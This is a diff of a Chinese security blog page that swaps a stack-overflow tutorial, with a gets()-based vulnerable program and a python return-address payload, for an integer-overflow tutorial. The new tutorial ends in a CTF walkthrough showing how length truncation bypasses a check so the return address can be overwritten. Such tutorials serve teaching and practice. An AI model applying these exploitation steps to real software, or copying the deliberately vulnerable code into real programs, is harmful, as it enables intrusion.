@@ -85,7 +85,7 @@
 
 
 
-  <meta name="keywords" content="二进制安全,pwn,栈溢出," />
+  <meta name="keywords" content="二进制安全,pwn,整数溢出," />
 
 
 
@@ -96,30 +96,26 @@
 
 
 
-<meta name="description" content="最近事情较多，又是停了好久才更，无奈，我渴望知识的心灵遭受到了创伤">
-<meta name="keywords" content="二进制安全,pwn,栈溢出">
+<meta name="description" content="一个经常被忽视的溢出">
+<meta name="keywords" content="二进制安全,pwn,整数溢出">
 <meta property="og:type" content="article">
-<meta property="og:title" content="走进栈溢出">
-<meta property="og:url" content="http://1234xxh.github.io/2020/03/04/1/index.html">
+<meta property="og:title" content="不一样的整数溢出">
+<meta property="og:url" content="http://1234xxh.github.io/2020/03/25/1/index.html">
 <meta property="og:site_name" content="ThreePwn&#39;s Blog">
-<meta property="og:description" content="最近事情较多，又是停了好久才更，无奈，我渴望知识的心灵遭受到了创伤">
+<meta property="og:description" content="一个经常被忽视的溢出">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://1234xxh.github.io/image/N2LL/8.jpg">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/1.png">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/2.png">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/3.png">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/4.png">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/5.png">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/6.png">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/7.png">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/8.png">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/9.png">
-<meta property="og:image" content="http://1234xxh.github.io/image/20200304/10.png">
-<meta property="og:updated_time" content="2020-03-14T02:39:16.173Z">
+<meta property="og:image" content="http://1234xxh.github.io/image/N2LL/10.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200325/1.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200325/2.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200325/3.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200325/4.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200325/5.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200325/6.png">
+<meta property="og:updated_time" content="2020-03-25T13:49:40.786Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="走进栈溢出">
-<meta name="twitter:description" content="最近事情较多，又是停了好久才更，无奈，我渴望知识的心灵遭受到了创伤">
-<meta name="twitter:image" content="http://1234xxh.github.io/image/N2LL/8.jpg">
+<meta name="twitter:title" content="不一样的整数溢出">
+<meta name="twitter:description" content="一个经常被忽视的溢出">
+<meta name="twitter:image" content="http://1234xxh.github.io/image/N2LL/10.jpg">
 
 
 
@@ -149,13 +145,13 @@
 
 
 
-  <link rel="canonical" href="http://1234xxh.github.io/2020/03/04/1/"/>
+  <link rel="canonical" href="http://1234xxh.github.io/2020/03/25/1/"/>
 
 
 
 
 
-  <title>走进栈溢出 | ThreePwn's Blog</title>
+  <title>不一样的整数溢出 | ThreePwn's Blog</title>
   
 
 
@@ -318,7 +314,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2020/03/04/1/">
+    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2020/03/25/1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ThreePwn">
@@ -335,7 +331,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">走进栈溢出</h1>
+          <h1 class="post-title" itemprop="name headline">不一样的整数溢出</h1>
         
 
         <div class="post-meta">
@@ -347,8 +343,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-04T22:44:28+08:00">
-                2020-03-04
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-25T21:35:47+08:00">
+                2020-03-25
               </time>
             
 
@@ -365,7 +361,7 @@
 
           
           
-             <span id="/2020/03/04/1/" class="leancloud_visitors" data-flag-title="走进栈溢出">
+             <span id="/2020/03/25/1/" class="leancloud_visitors" data-flag-title="不一样的整数溢出">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -401,25 +397,97 @@
       
 
       
-        <p>最近事情较多，又是停了好久才更，无奈，我渴望知识的心灵遭受到了创伤</p>
-<p><img src="/image/N2LL/8.jpg" alt="image"><br><a id="more"></a></p>
-<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><blockquote>
-<p>和我一样，有一些计算机专业的同学可能一直都在不停地码代码，却很少关注程序是怎么执行的，也不会考虑到自己写的代码是否会存在栈溢出漏洞，借此机会我们一起走进栈溢出。</p>
+        <p>一个经常被忽视的溢出</p>
+<p><img src="/image/N2LL/10.jpg" alt="image"><br><a id="more"></a></p>
+<h1 id="0x01为什么会存在整数溢出"><a href="#0x01为什么会存在整数溢出" class="headerlink" title="0x01为什么会存在整数溢出"></a>0x01为什么会存在整数溢出</h1><blockquote>
+<p>回答这个问题前，我们需要了解下整数在计算机的存储方式。在计算机中，因为二值逻辑，只有开和关（通电、断电）来表示两种状态，这刚好与”0”、”1”相对应，因此在存储单元都是以0和1来呈现，那么对于有符号数与无符号数的区别就是：以所能表示的长度的空间，它的最高位所代表的性质不同，如下如所示：</p>
 </blockquote>
-<h1 id="0x02-程序是怎么运行的"><a href="#0x02-程序是怎么运行的" class="headerlink" title="0x02 程序是怎么运行的"></a>0x02 程序是怎么运行的</h1><blockquote>
-<p>在了解栈溢出之前我们先了解一下程序执行过程<br>程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到call指令的下一条指令继续执行，函数调用过程通常使用堆栈实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">	test1(1);</span><br><span class="line">	test2(2);</span><br><span class="line">	test3(3);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">int test1(int test1)&#123;</span><br><span class="line">int a = 6;</span><br><span class="line">	printf(&quot;1&quot;);</span><br><span class="line">	return 1;</span><br><span class="line">&#125;</span><br><span class="line">int test2(int test2)&#123;</span><br><span class="line">	printf(&quot;2&quot;);</span><br><span class="line">	return 2;</span><br><span class="line">&#125;</span><br><span class="line">int test3(int test3)&#123;</span><br><span class="line">	printf(&quot;3&quot;);</span><br><span class="line">	return 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-</blockquote>
+<p><img src="/image/20200325/1.png" alt="image"></p>
 <blockquote>
-<p>将以上代码编译成32位可执行文件，放在ollydbg中就行调试，来详细看一下执行过程<br>因为程序的执行可以看做一个一个函数的执行(main函数也一样)，因此我们挑选其中一个即可，在test1()函数设置断点<br><img src="/image/20200304/1.png" alt="image"><br>F7单步调试<br>第一步mov dword ptr ss:[esp],0x1，进行传参，简洁明了。<br>第二步call mian.00401559，进入test()，这里我们关注一下esp和栈顶值，将该指令的下一条指令的地址进行压栈，既然有压栈那么就会有出栈，这就与函数中的retn指令形成呼应。<br><img src="/image/20200304/2.png" alt="image"><br>第三步push ebp，就是把ebp的值进行压栈，那么这个ebp是什么呢？有什么用呢？<br>EBP叫做扩展基址指针寄存器(extended base pointer) ，里面放一个指针，该指针指向系统栈最上面一个栈帧的底部，用于C运行库访问栈中的局部变量和参数。<br>那么这一步的意义就是：保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧<br><img src="/image/20200304/3.png" alt="image"><br>第四步，mov ebp，esp，将esp的值放在ebp中，我们再来了解一下什么是esp？<br>ESP（Extended Stack Pointer）为扩展栈指针寄存器，是指针寄存器的一种，用于存放函数栈顶指针，指向栈的栈顶（下一个压入栈的活动记录的顶部），也就是它不停在变，刚才提到的ebp指向栈底，在函数内部执行过程中是不变。<br>那么我们再看一下这一步的作用：<br>从第三步可以知道esp存储的值是旧栈帧中的帧基指针，而esp值栈顶指针，随时都在变，因此为了函数结束后能恢复，把esp值（外层函数栈底地址）保存在本函数栈底ebp中。简而言之，将内部函数ebp的值作为地址，它存放外函数的ebp的值。这一步在末尾也存在逆向指令leave。<br><img src="/image/20200304/4.png" alt="image"><br>第五步是sub esp,0x28，开辟该函数的局部变量空间<br>紧接着第六步mov dword ptr ss:[ebp-0xC],0x6，给变量a一个大小是0xC的空间，并且赋值。<br>然后就是传参字符1的ascii码，调用printf函数，把返回值放到eax。<br>我们重点来看leave指令，可以发现ebp的值恢复了，esp的值也变了，相当于mov esp,ebp;pop ebp<br><img src="/image/20200304/5.png" alt="image"><br>最后执行retn指令，至此一个函数执行完毕，esp和eip的值都被改变，相当于pop eip，然后程序继续执行。<br>EIP是指令寄存器，存放当前指令的下一条指令的地址。CPU该执行哪条指令就是通过EIP来指示的<br><img src="/image/20200304/6.png" alt="image"></p>
+<p>这是一个存放8个1的8bit长度的存储单元，其最高位的不同(符号位和数值位)决定了它的绝对值的不同，当然决定了其取值范围的不同。<br>把握其中的三个关键点：<br>一、固定长度的空间(存储单元)<br>二、符号位和数值位<br>三、如果运算后发生进位溢出，绿色区域的空间依旧可以用<br>其实这样梳理以后，整数溢出的原理就随之对应而来了。</p>
 </blockquote>
-<h1 id="0x03-栈溢出"><a href="#0x03-栈溢出" class="headerlink" title="0x03 栈溢出"></a>0x03 栈溢出</h1><blockquote>
-<p>分析完这一过程，相信大家对函数是怎么执行的应该明朗了，那么我们言归正传，继续聊一下栈溢出。<br>首先我们先看一下什么是栈？<br>栈可以看作是一个漏斗，栈底地址大，栈顶地址小，然后在一个存储单元中，按照由小到大进行存储，它的目的是赋予程序一个方便的途径来访问特定函数的局部数据，并从函数调用者那边传递信息。<br>栈溢出属于缓冲区溢出，指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。另外，我们也不难发现，发生栈溢出的基本前提是：程序必须向栈上写入数据、写入的数据大小没有被良好地控制。<br>引用一个例子来了解一下栈溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[12];</span><br><span class="line">  gets(s);</span><br><span class="line">  puts(s);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="0x02-整数溢出原理"><a href="#0x02-整数溢出原理" class="headerlink" title="0x02 整数溢出原理"></a>0x02 整数溢出原理</h1><blockquote>
+<p>先来看一下整数溢出的危害<br>如果我们用某个整数来表示空间的大小或者说索引，那么整数溢出可以导致堆溢出或者栈溢出，间接导致任意代码执行。可以发现，整数溢出，实际上就是程序没有按照我们正常逻辑去进行(出乎意料)，被恶意利用后就会产生危害。<br>可以对应上述(关键点)三种情况：<br>一、两个不同长度的储存空间进行赋值。将一个长度较长的数赋值给长度较短的空间，高位会被截断。<br>二、有符号数与无符号数之间的转换。由于最高位的性质不同，导致各种出乎意料的状况发生。<br>三、有(无)符号数的四则运算。比如符号相同的数就行相加，只有数值最高位或者符号位进位时，就会发生溢出；较大的无符号数的相加也会导致溢出。<br>具体的一些细节可以参考《计算机组成原理》的计算机的运算方法。</p>
 </blockquote>
+<h1 id="0x03-整数溢出例子分解"><a href="#0x03-整数溢出例子分解" class="headerlink" title="0x03 整数溢出例子分解"></a>0x03 整数溢出例子分解</h1><blockquote>
+<p>知道了原理，也清楚了类型，这里就一个一个分解，个人感觉论溢出的时候，从二进制出发考虑数据类型的取值范围和溢出临界点会更容易理解。</p>
+</blockquote>
+<h2 id="一、截断"><a href="#一、截断" class="headerlink" title="一、截断"></a>一、截断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    int a = 65536;                   // 0x10000 -&gt; 1 0000 0000 0000 0000</span><br><span class="line">    short b;                     </span><br><span class="line">    b = a;</span><br><span class="line">    printf(&quot;%d\n&quot;, b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>很显然符合以上两个条件，gets()成为突破口<br>我们在主函数处下断点，运行和调试<br><img src="/image/20200304/7.png" alt="image"><br>lea eax，dword ptr ss:[ebp-0x14] 这时开辟一个空间给变量，也即是s，如图所示<br><img src="/image/20200304/8.png" alt="image"><br>我们想执行sucess()函数，要怎么办呢？<br>执行完vulnerable()函数后，会还原ebp，改变esp的值(leave)，然后retn，也就是pop eip，然后CPU根据eip指针指向的指令继续运行。<br>我们能抓到的点就是控制eip，怎么控制？通过控制栈顶的值，那么栈顶的值是什么？栈顶的值是进入该函数时储存的下一条指令的地址。这里提一点，进入函数，要保存两个值：下一条命令的地址、EBP旧栈帧的帧基指针，只有这样才能完全恢复。<br>此时我们可以构造payload，来控制我们要控制的地方，栈中存储EBP值的存储单元的上一个存储单元，也就是图中的存储address的存储单元<br>我们先试验一下<br>输入0x14 *‘A’+BBBB+0000，发生的变化<br><img src="/image/20200304/9.png" alt="image"><br>很好，按照我们的预想进行<br>(python -c ‘print “A”* 0x18+p32(0x00401520)’) 就可以达到栈溢出的效果<br><img src="/image/20200304/10.png" alt="image"></p>
+<p>short 为16bit（其中1位符号位），int为32bit（其中1位符号位）当把a（17bit）赋值给b时，会发生高位截断，从而b为 0000 0000 0000 0000，也就是0。再来详细看一下具体执行过程。</p>
 </blockquote>
-<h1 id="0x04-尾记"><a href="#0x04-尾记" class="headerlink" title="0x04 尾记"></a>0x04 尾记</h1><blockquote>
-<p>还没有入门，只是个人的见解，如有错误，希望各位大佬指出。<br>参考：<br><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Stack_buffer_overflow</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0040152E    C74424 1C 00000&gt;mov dword ptr ss:[esp+0x1C],0x10000</span><br><span class="line">// Stack ss:[0061FE9C]=00010000</span><br><span class="line">00401536    8B4424 1C       mov eax,dword ptr ss:[esp+0x1C]</span><br><span class="line">// eax=00010000</span><br><span class="line">0040153A    66:894424 1A    mov word ptr ss:[esp+0x1A],ax</span><br><span class="line">// 重点来了，取eax的低16位的值放到ss:[0061FE9A]中，也就是0000</span><br><span class="line">0040153F    0FBF4424 1A     movsx eax,word ptr ss:[esp+0x1A]</span><br><span class="line">// eax=00000000</span><br><span class="line">00401544    894424 04       mov dword ptr ss:[esp+0x4],eax</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以发现，在执行的时候eax的高位被截断了，只有操作了低16位的存储的数值。</p>
+</blockquote>
+<h2 id="二、有-无-符号数之间的转换"><a href="#二、有-无-符号数之间的转换" class="headerlink" title="二、有(无)符号数之间的转换"></a>二、有(无)符号数之间的转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    unsigned short a = 32768;                   // 0x8000 -&gt; 1000 0000 0000 0000</span><br><span class="line">    short int b;                     </span><br><span class="line">    b = a;</span><br><span class="line">    printf(&quot;%d\n&quot;, b);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>此时b又是多少呢？按照刚才的方法，从二进制的数入手，显然b为：1000 0000 0000 0000，虽然每一位的数没有变，但是最高位的性质变了，现在为符号位，也就是表示负数，后面15位为数值。那么此时的值是多少呢？计算机对负数是以补码的形式进行保存的，因此值为-2的15次方*1，也就是-32768。再来详细看一下具体执行过程。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0040152E    66:C74424 1E 00&gt;mov word ptr ss:[esp+0x1E],0x8000</span><br><span class="line">// Stack ss:[0061FE9E]=8000</span><br><span class="line">00401535    0FB74424 1E     movzx eax,word ptr ss:[esp+0x1E]</span><br><span class="line">// eax=0008000</span><br><span class="line">0040153A    66:894424 1C    mov word ptr ss:[esp+0x1C],ax</span><br><span class="line">// Stack ss:[0061FE9C]=8000</span><br><span class="line">0040153F    0FBF4424 1C     movsx eax,word ptr ss:[esp+0x1C]</span><br><span class="line">// 可以发现两次用到了不同的指令movzx和movsx，第一个是无符号扩展，并传送，第二个带符号扩展，并传送，所以此处的eax=FFF8000</span><br><span class="line">00401544    894424 04       mov dword ptr ss:[esp+0x4],eax</span><br></pre></td></tr></table></figure>
+<h2 id="三、有-无-符号的四则运算"><a href="#三、有-无-符号的四则运算" class="headerlink" title="三、有(无)符号的四则运算"></a>三、有(无)符号的四则运算</h2><blockquote>
+<p>先来看有符号的加法</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    short a = 32767;                   // 0x7fff -&gt; 0111 1111 1111 1111            </span><br><span class="line">    a++;</span><br><span class="line">    printf(&quot;%d\n&quot;, a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>short最大数加一后，就会变成最小数。</p>
+</blockquote>
+<p><img src="/image/20200325/2.png" alt="image"></p>
+<blockquote>
+<p>再来详细看一下具体执行过程。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0040152E    66:C74424 1E FF&gt;mov word ptr ss:[esp+0x1E],0x7FFF</span><br><span class="line">// Stack ss:[0061FE9E]=7FFF</span><br><span class="line">00401535    0FB74424 1E     movzx eax,word ptr ss:[esp+0x1E]</span><br><span class="line">// eax=0007FFF</span><br><span class="line">0040153A    83C0 01         add eax,0x1</span><br><span class="line">// 执行自加，eax=008000</span><br><span class="line">0040153D    66:894424 1E    mov word ptr ss:[esp+0x1E],ax</span><br><span class="line">// Stack ss:[0061FE9E]=8000</span><br><span class="line">00401542    0FBF4424 1E     movsx eax,word ptr ss:[esp+0x1E]</span><br><span class="line">// 使用movsx把0x8000再次放进eax中，eax=FFF8000</span><br><span class="line">00401547    894424 04       mov dword ptr ss:[esp+0x4],eax</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>分析完这几个类型后，疑惑就来了，说了这么多怎么利用呢？</p>
+</blockquote>
+<h1 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h1><blockquote>
+<p>这里选用攻防世界的int_overflow为例进行分析<br>拖到IDA中查看伪代码</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)&#123;</span><br><span class="line">  int v4; // [esp+Ch] [ebp-Ch]</span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  puts(&quot;---------------------&quot;);</span><br><span class="line">  puts(&quot;~~ Welcome to CTF! ~~&quot;);</span><br><span class="line">  puts(&quot;       1.Login       &quot;);</span><br><span class="line">  puts(&quot;       2.Exit        &quot;);</span><br><span class="line">  puts(&quot;---------------------&quot;);</span><br><span class="line">  printf(&quot;Your choice:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">  if ( v4 == 1 )&#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    if ( v4 == 2 )&#123;</span><br><span class="line">      puts(&quot;Bye~&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Invalid Choice!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>没有发现可疑问题，查看login()函数</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int login()&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-228h]</span><br><span class="line">  char s; // [esp+200h] [ebp-28h]</span><br><span class="line">  memset(&amp;s, 0, 0x20u);</span><br><span class="line">  memset(&amp;buf, 0, 0x200u);</span><br><span class="line">  puts(&quot;Please input your username:&quot;);</span><br><span class="line">  read(0, &amp;s, 0x19u);</span><br><span class="line">  printf(&quot;Hello %s\n&quot;, &amp;s);</span><br><span class="line">  puts(&quot;Please input your passwd:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x199u);</span><br><span class="line">  return check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>似乎也没什么可疑的地方，继续查看check_passwd(&amp;buf)，可以先注意下变量buf，因为他是可控的，长度为0x199</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">char *__cdecl check_passwd(char *s)&#123;</span><br><span class="line">  char *result; // eax</span><br><span class="line">  char dest; // [esp+4h] [ebp-14h]</span><br><span class="line">  unsigned __int8 v3; // [esp+Fh] [ebp-9h]</span><br><span class="line">  v3 = strlen(s);</span><br><span class="line">  if ( v3 &lt;= 3u || v3 &gt; 8u ) &#123;</span><br><span class="line">    puts(&quot;Invalid Password&quot;);</span><br><span class="line">    result = (char *)fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    result = strcpy(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>查看到这里，我们首先发现就是strcpy函数导致的栈溢出，为什么这么说呢？<br>变量buf的长度0x199，又可以发现变量dest的位置是ebp-14h，也就是我们可以控制变量s来控制函数的返回值，进而控制EIP的值，详细的原理和方法，可以参看<a href="http://bey0nd.xyz/2020/03/04/1/" target="_blank" rel="noopener">走进栈溢出</a>和<a href="http://bey0nd.xyz/2020/03/15/1/" target="_blank" rel="noopener">初探ROP</a>。<br>但是问题又来了，程序用了一个if语句限制了变量buf的长度，使得我们无法达到所想的栈溢出效果，是不是就无法攻击了？回到这一篇文章的核心思想，就知道我们需要寻找整数的溢出的地方。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int8 v3; // [esp+Fh] [ebp-9h]</span><br><span class="line">v3 = strlen(s);</span><br><span class="line">if ( v3 &lt;= 3u || v3 &gt; 8u ) &#123;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以发现v3是一个8bit的无符号的变量，但是我们的变量buf(后面表示为s)的长度却可以达到0x199，也就是409bit的长度，这里就是我们在文章开头提到的第一种情况：将一个长度较长的数赋值给长度较短的空间，高位会被截断。如下图所示：</p>
+</blockquote>
+<p><img src="/image/20200325/3.png" alt="image"></p>
+<blockquote>
+<p>v3的数值就是s的长度的低8位的数值，所以我们只要控制低8位的值就可以绕过if，完成后面的栈溢出攻击。<br>继续分析，v3∈(3, 8]，化为二进制(0000 0011, 0000 1000]，那么s的长度(设为L)的后八位应该为(0000 0011, 0000 1000]，要想达到整数溢出，L的第九位数值必须为1，即L(低九位)∈(10000 0011, 10000 1000]，也就是(259, 264],这也是整个L的长度。构造payload来获取flag，在IDA中可以找到</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int what_is_this()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br><span class="line">对应</span><br><span class="line">.text:0804868B what_is_this    proc near</span><br><span class="line">.text:0804868B ; __unwind &#123;</span><br><span class="line">.text:0804868B                 push    ebp</span><br><span class="line">.text:0804868C                 mov     ebp, esp</span><br><span class="line">.text:0804868E                 sub     esp, 8</span><br><span class="line">.text:08048691                 sub     esp, 0Ch</span><br><span class="line">.text:08048694                 push    offset command  ; &quot;cat flag&quot;</span><br><span class="line">.text:08048699                 call    _system</span><br><span class="line">.text:0804869E                 add     esp, 10h</span><br><span class="line">.text:080486A1                 nop</span><br><span class="line">.text:080486A2                 leave</span><br><span class="line">.text:080486A3                 retn</span><br><span class="line">.text:080486A3 ; &#125; // starts at 804868B</span><br><span class="line">.text:080486A3 what_is_this    endp</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>把返回地址覆盖为0x804868B即可获取flag，构造payload</p>
+</blockquote>
